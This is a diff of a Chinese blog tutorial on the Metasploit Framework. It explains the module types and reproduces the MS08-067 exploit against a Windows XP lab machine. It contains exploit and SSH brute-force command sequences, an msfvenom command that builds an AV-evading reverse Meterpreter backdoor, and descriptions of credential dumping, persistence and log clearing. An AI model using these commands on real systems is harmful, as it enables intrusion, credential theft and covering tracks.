@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://jasmine-iris.top/img/photo.png">
 <meta property="article:published_time" content="2026-07-11T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-07-16T05:12:42.571Z">
+<meta property="article:modified_time" content="2026-07-17T06:10:07.338Z">
 <meta property="article:author" content="Jasmine_Iris">
 <meta property="article:tag" content="MSF">
 <meta property="article:tag" content="渗透测试">
@@ -19,7 +19,7 @@
   "url": "https://jasmine-iris.top/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/",
   "image": "https://jasmine-iris.top/img/photo.png",
   "datePublished": "2026-07-11T04:00:00.000Z",
-  "dateModified": "2026-07-16T05:12:42.571Z",
+  "dateModified": "2026-07-17T06:10:07.338Z",
   "author": [
     {
       "@type": "Person",
@@ -178,7 +178,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg.css?v=85"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post-1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">MSF的使用以及漏洞复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">MSF的使用以及漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-11T04:00:00.000Z" title="发表于 2026-07-11 12:00:00">2026-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-16T05:12:42.571Z" title="更新于 2026-07-16 13:12:42">2026-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="local-pv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="local-pageview-count">-</span></span><script>setTimeout(() => {
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg.css?v=85"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post-1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">MSF的使用以及漏洞复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">MSF的使用以及漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-11T04:00:00.000Z" title="发表于 2026-07-11 12:00:00">2026-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-17T06:10:07.338Z" title="更新于 2026-07-17 14:10:07">2026-07-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="local-pv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="local-pageview-count">-</span></span><script>setTimeout(() => {
   const key = 'pv_' + location.pathname
   const el = document.getElementById('local-pageview-count')
   const pvBlock = el && el.closest('.local-pv')
@@ -204,11 +204,12 @@
     icon.className = 'fa-solid fa-eye fa-fw post-meta-icon'
   }
 }, 0)
-</script></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一、MSF-是什么？"><a href="#一、MSF-是什么？" class="headerlink" title="一、MSF 是什么？"></a>一、MSF 是什么？</h1><h2 id="一-基础概述"><a href="#一-基础概述" class="headerlink" title="(一) 基础概述"></a>(一) 基础概述</h2><p><strong>定义</strong>：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。</p>
-<p><strong>主要功能</strong>：漏洞利用、生成攻击载荷、监听反弹连接、后渗透控制； 常用组件为<code>msfconsole</code>交互控制台、<code>msfvenom</code>后门生成工具。  </p>
+</script></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="MSF-是什么？"><a href="#MSF-是什么？" class="headerlink" title="MSF 是什么？"></a>MSF 是什么？</h1><h2 id="基础概述"><a href="#基础概述" class="headerlink" title="基础概述"></a>基础概述</h2><p><strong>定义</strong>：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。</p>
+<p><strong>主要功能</strong>：漏洞利用、生成攻击载荷、监听反弹连接、后渗透( 当攻击者**成功利用漏洞、拿到目标主机控制会话(Meterpreter)**之后，所执行的全部操作)； 常用组件为<code>msfconsole</code>交互控制台、<code>msfvenom</code>后门生成工具。  </p>
 <p><strong>安装目录（Kali默认）</strong><br><code>/usr/share/metasploit-framework/</code></p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img1.png"></p>
-<h2 id="二-核心目录分工"><a href="#二-核心目录分工" class="headerlink" title="(二) 核心目录分工"></a>(二) 核心目录分工</h2><table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737394842-b650945a-0e5d-48f2-8faf-e3c4a845a82f.png"></p>
+<h2 id="核心目录分工"><a href="#核心目录分工" class="headerlink" title="核心目录分工"></a>核心目录分工</h2><table>
 <thead>
 <tr>
 <th>目录</th>
@@ -236,8 +237,9 @@
 <td>独立编码、漏洞分析小工具</td>
 </tr>
 </tbody></table>
-<h2 id="三-modules六大子模块详解"><a href="#三-modules六大子模块详解" class="headerlink" title="(三) modules六大子模块详解"></a>(三) modules六大子模块详解</h2><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img2.png"></p>
-<h3 id="1-Auxiliary-辅助模块"><a href="#1-Auxiliary-辅助模块" class="headerlink" title="1. Auxiliary 辅助模块"></a>1. Auxiliary 辅助模块</h3><ul>
+<h2 id="modules六大子模块详解"><a href="#modules六大子模块详解" class="headerlink" title="modules六大子模块详解"></a>modules六大子模块详解</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737472585-4ae21c91-fc21-4de8-9332-08c6419e9f84.png"></p>
+<h3 id="Auxiliary-辅助模块"><a href="#Auxiliary-辅助模块" class="headerlink" title="Auxiliary 辅助模块"></a>Auxiliary 辅助模块</h3><ul>
 <li>目录：modules&#x2F;auxiliary&#x2F;</li>
 <li>作用：不执行漏洞提权、不反弹shell；信息收集、扫描、爆破、嗅探、验证</li>
 <li>特点：无payload，单纯工具类，绝大多数不需要目标存在漏洞</li>
@@ -259,7 +261,7 @@
 <p>示例 3：SSH 弱口令爆破</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> USER_FILE /usr/share/wordlists/metasploit/default_users_for_smb.txt</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /usr/share/wordlists/metasploit/password.lst</span><br><span class="line"><span class="built_in">set</span> THREADS 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-Exploits-漏洞利用模块（EXP）"><a href="#2-Exploits-漏洞利用模块（EXP）" class="headerlink" title="2. Exploits 漏洞利用模块（EXP）"></a>2. Exploits 漏洞利用模块（EXP）</h3><ul>
+<h3 id="Exploits-漏洞利用模块（EXP）"><a href="#Exploits-漏洞利用模块（EXP）" class="headerlink" title="Exploits 漏洞利用模块（EXP）"></a>Exploits 漏洞利用模块（EXP）</h3><ul>
 <li>目录：modules&#x2F;exploits&#x2F;</li>
 <li>作用：利用程序漏洞触发内存溢出、命令执行、文件上传等缺陷，开辟通道</li>
 <li>特点：必须搭配Payload使用！exp负责打通漏洞通道，payload负责执行代码</li>
@@ -271,15 +273,19 @@
 </ul>
 </li>
 </ul>
-<h3 id="3-Payloads-攻击载荷（Shellcode）"><a href="#3-Payloads-攻击载荷（Shellcode）" class="headerlink" title="3. Payloads 攻击载荷（Shellcode）"></a>3. Payloads 攻击载荷（Shellcode）</h3><ul>
+<h3 id="Payloads-攻击载荷（Shellcode）"><a href="#Payloads-攻击载荷（Shellcode）" class="headerlink" title="Payloads 攻击载荷（Shellcode）"></a>Payloads 攻击载荷（Shellcode）</h3><ul>
 <li>目录：modules&#x2F;payloads&#x2F;</li>
 <li>作用：漏洞利用成功后，在目标机器上最终执行的代码</li>
 <li>Payload三大类型<ol>
-<li><strong>Single</strong><br>完整代码一体，不需要外部连接，一次性执行。<br>例：<code>windows/adduser</code> → 直接在目标新建管理员账号</li>
-<li><strong>Stager</strong><br>体积短小，先运行小段代码，<strong>主动回连攻击机</strong>，再下载完整shellcode。<br>优点：体积小，容易绕过缓冲区长度限制<br>典型：<code>reverse_tcp</code> 反向连接</li>
-<li><strong>Stage</strong><br>Stager连接成功后，后续下载运行的大代码，如Meterpreter</li>
+<li><strong>Single</strong><br>完整代码全部打包在一起，不需要联网、不用回连，执行完直接完事。<br>例：<code>windows/adduser</code> → 直接在目标新建管理员账号</li>
 </ol>
 </li>
+</ul>
+<p>缺点：代码体积大，很多漏洞缓冲区放不下，很少用。  </p>
+<pre><code>2. **Stager**  
+</code></pre>
+<p>体积短小，先运行小段代码，<strong>主动回连攻击机</strong>，再下载完整shellcode。<br>优点：体积小，容易绕过缓冲区长度限制<br>典型：<code>reverse_tcp</code> 反向连接<br>    3. <strong>Stage</strong><br>Stager连接成功后，后续下载运行的大代码，如Meterpreter，<strong>实现控制的完整功能代码</strong>， 包含截屏、文件操作、提权、远程桌面所有功能。 </p>
+<ul>
 <li>高频Payload：<ul>
 <li><code>windows/meterpreter/reverse_tcp</code> Windows反向Meterpreter（最常用）</li>
 <li><code>linux/x86/meterpreter/reverse_tcp</code> Linux反弹</li>
@@ -290,34 +296,36 @@
 <blockquote>
 <p>Meterpreter属于高级payload，内存运行、无落地文件、功能极强</p>
 </blockquote>
-<h3 id="4-Encoders-编码器（免杀编码）"><a href="#4-Encoders-编码器（免杀编码）" class="headerlink" title="4. Encoders 编码器（免杀编码）"></a>4. Encoders 编码器（免杀编码）</h3><ul>
-<li>目录：modules&#x2F;encoders&#x2F;<br>作用：对payload进行编码变形，规避杀毒软件、IDS、防火墙特征检测</li>
+<h3 id="Encoders-编码器（免杀编码）"><a href="#Encoders-编码器（免杀编码）" class="headerlink" title="Encoders 编码器（免杀编码）"></a>Encoders 编码器（免杀编码）</h3><ul>
+<li>目录：modules&#x2F;encoders&#x2F;<br>作用：对payload进行编码变形，绕过杀毒软件、IDS、防火墙特征检测</li>
 <li>核心原理：原始shellcode存在固定特征，容易被AV查杀；编码器替换字符、改变二进制序列，运行时自动解码还原。</li>
 <li>经典编码器：<code>x86/shikata_ga_nai</code> 万花筒编码器</li>
 </ul>
+<p> 生成 exe 后门时加 <code>-e</code> 参数调用，多次编码提升免杀概率。  </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfvenom示例，编码5次</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
-<h3 id="5-Nops-空指令模块（NOP生成器）"><a href="#5-Nops-空指令模块（NOP生成器）" class="headerlink" title="5. Nops 空指令模块（NOP生成器）"></a>5. Nops 空指令模块（NOP生成器）</h3><ul>
+<h3 id="Nops-空指令模块（NOP生成器）"><a href="#Nops-空指令模块（NOP生成器）" class="headerlink" title="Nops 空指令模块（NOP生成器）"></a>Nops 空指令模块（NOP生成器）</h3><ul>
 <li>目录：modules&#x2F;nops&#x2F;</li>
 </ul>
 <blockquote>
-<p>NOP &#x3D; No Operation，CPU空指令 <code>0x90</code><br><strong>作用：生成一串无任何功能的空指令，填充缓冲区，用于缓冲区溢出漏洞开发</strong></p>
+<p>NOP &#x3D; No Operation，<code>0x90</code>，CPU空指令：执行这条命令什么都不做，直接跳过到下一条代码。</p>
+<p><strong>作用：生成一串无任何功能的空指令，填充缓冲区，用于缓冲区溢出漏洞开发</strong></p>
 </blockquote>
 <ul>
 <li>原理：溢出利用时，很难精准命中shellcode起始地址；大量<code>0x90</code>滑行区，只要跳转进NOP区域，CPU一路空滑，最终执行payload。</li>
 <li>适用场景：<strong>漏洞研究、自行编写EXP</strong></li>
 </ul>
-<h3 id="6-Post-后渗透模块"><a href="#6-Post-后渗透模块" class="headerlink" title="6. Post 后渗透模块"></a>6. Post 后渗透模块</h3><ul>
+<h3 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h3><ul>
 <li>目录：modules&#x2F;post&#x2F;</li>
 <li>触发时机：已经拿到目标权限（Meterpreter会话）之后使用， 依赖 SESSION。</li>
 <li>作用：权限维持、信息窃取、内网横向移动、提权、痕迹清理</li>
-<li>常用分类：<ol>
-<li>权限提升：<code>post/windows/escalate/getsystem</code></li>
-<li>信息收集：获取密码、浏览器记录、系统账号、进程</li>
-<li>持久化后门：创建服务、注册表自启动</li>
-<li>内网渗透：ARP扫描、路由转发、抓取凭证</li>
-<li>清除日志、dump内存密码（mimikatz集成在内）</li>
-</ol>
+<li>核心功能<ul>
+<li><strong>权限提升</strong>：post&#x2F;windows&#x2F;escalate&#x2F;getsystem：Windows 一键提权到系统最高权限</li>
+<li><strong>信息收集</strong>：抓取系统账号、密码哈希、浏览器记录、进程、文件（例：hashdump导出密码）</li>
+<li><strong>持久化后门</strong>：写入开机自启、系统服务，就算对方重启电脑，你依然能连上</li>
+<li><strong>内网横向渗透</strong>：以当前被控主机为跳板，扫描内网其他机器、窃取内网凭证</li>
+<li><strong>痕迹清理</strong>：删除系统日志、抓取内存明文密码（集成 mimikatz 工具）</li>
+</ul>
 </li>
 <li>使用方式：</li>
 </ul>
@@ -327,7 +335,7 @@
 <p>方式2：background会话后use调用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background			<span class="comment"># 将会话放到后台，得到session编号</span></span><br><span class="line">sessions        <span class="comment"># 查看所有会话</span></span><br><span class="line"></span><br><span class="line">use post/windows/gather/credentials/windows_autologin</span><br><span class="line"><span class="built_in">set</span> SESSION 1		<span class="comment"># 指定使用哪一条meterpreter会话</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<h1 id="二、MSF控制台基础命令"><a href="#二、MSF控制台基础命令" class="headerlink" title="二、MSF控制台基础命令"></a>二、MSF控制台基础命令</h1><table>
+<h1 id="MSF控制台基础命令"><a href="#MSF控制台基础命令" class="headerlink" title="MSF控制台基础命令"></a>MSF控制台基础命令</h1><table>
 <thead>
 <tr>
 <th>命令</th>
@@ -391,77 +399,111 @@
 <td>退出会话或MSF控制台</td>
 </tr>
 </tbody></table>
-<h3 id="1-msfconsole"><a href="#1-msfconsole" class="headerlink" title="1. msfconsole"></a>1. msfconsole</h3><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img3.png"></p>
-<h3 id="2-？"><a href="#2-？" class="headerlink" title="2. ？"></a>2. ？</h3><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img4.png"></p>
-<h3 id="3-search"><a href="#3-search" class="headerlink" title="3. search"></a>3. search</h3><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img5.png"></p>
-<h3 id="4-use"><a href="#4-use" class="headerlink" title="4. use"></a>4. use</h3><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img6.png"></p>
-<h3 id="5-exit"><a href="#5-exit" class="headerlink" title="5. exit"></a>5. exit</h3><p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img7.png"></p>
-<h1 id="三、MSF-渗透测试"><a href="#三、MSF-渗透测试" class="headerlink" title="三、MSF 渗透测试"></a>三、MSF 渗透测试</h1><h2 id="一-MS08-067"><a href="#一-MS08-067" class="headerlink" title="(一) MS08-067"></a>(一) MS08-067</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p><strong>MS08-067</strong> 是Windows XP及部分旧版本Windows系统中著名的<strong>远程代码执行漏洞</strong>（CVE-2008-4250），存在于 <strong>Server服务的RPC请求处理</strong> 中。</p>
+<ol>
+<li>msfconsole</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737947048-99dd459f-d218-4fe1-92bd-2b3c9b726bf4.png"></p>
+<ol start="2">
+<li>？</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737991704-b1e8b600-1994-4fe7-aaa5-315d770e83e8.png"></p>
+<ol start="3">
+<li>earch</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738030387-49743920-f7ed-4c1b-bc4b-046e9b459077.png"></p>
+<ol start="4">
+<li>use</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738052954-a1685864-c24a-430b-909a-f93616ef5960.png"></p>
+<ol start="5">
+<li>exit</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738074110-36591cde-d521-421d-9b45-77a9b0ea8aae.png"></p>
+<h1 id="MSF-渗透测试"><a href="#MSF-渗透测试" class="headerlink" title="MSF 渗透测试"></a>MSF 渗透测试</h1><h2 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>MS08-067</strong> 是Windows XP及部分旧版本Windows系统中著名的<strong>远程代码执行漏洞</strong>（CVE-2008-4250），存在于 <strong>Server服务的RPC请求处理</strong> 中。</p>
 <p>攻击者可通过 <strong>SMB（端口445）</strong> 发送特制RPC请求，触发 <em>NetPathCanonicalize</em> 函数的缓冲区溢出，从而在<strong>无需身份验证</strong>的情况下执行任意代码。该漏洞曾被蠕虫病毒 <strong>Conficker</strong> 大规模利用。</p>
-<h3 id="2-命令行汇总"><a href="#2-命令行汇总" class="headerlink" title="2. 命令行汇总"></a>2. 命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 静默启动MSF控制台</span></span><br><span class="line">msfconsole -q</span><br><span class="line"><span class="comment"># 2. 检索MS08-067漏洞模块</span></span><br><span class="line">search ms08-067</span><br><span class="line"><span class="comment"># 3. 加载漏洞利用模块</span></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="comment"># 4. 查看模块所需配置参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 5. 设置受害机IP</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx</span><br><span class="line"><span class="comment"># 6. 执行漏洞攻击</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 7. 成功进入meterpreter后调出系统cmd命令行</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 8. 返回meterpreter控制台</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h3 id="命令行汇总"><a href="#命令行汇总" class="headerlink" title="命令行汇总"></a>命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 静默启动MSF控制台</span></span><br><span class="line">msfconsole -q</span><br><span class="line"><span class="comment"># 2. 检索MS08-067漏洞模块</span></span><br><span class="line">search ms08-067</span><br><span class="line"><span class="comment"># 3. 加载漏洞利用模块</span></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="comment"># 4. 查看模块所需配置参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 5. 设置受害机IP</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx</span><br><span class="line"><span class="comment"># 6. 执行漏洞攻击</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 7. 成功进入meterpreter后调出系统cmd命令行</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 8. 返回meterpreter控制台</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3. 攻击步骤"></a>3. 攻击步骤</h3><p><strong>环境</strong>：WinXP SP3，445端口开放</p>
+
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>环境</strong>：WinXP SP3，445端口开放</p>
 <p><strong>前提条件</strong>：已知目标机的 IP 地址 192.168.23.136</p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img8.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png"></p>
 <ol>
 <li>启动 MSF 框架，准备攻击，执行 msfconsole 命令</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img9.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
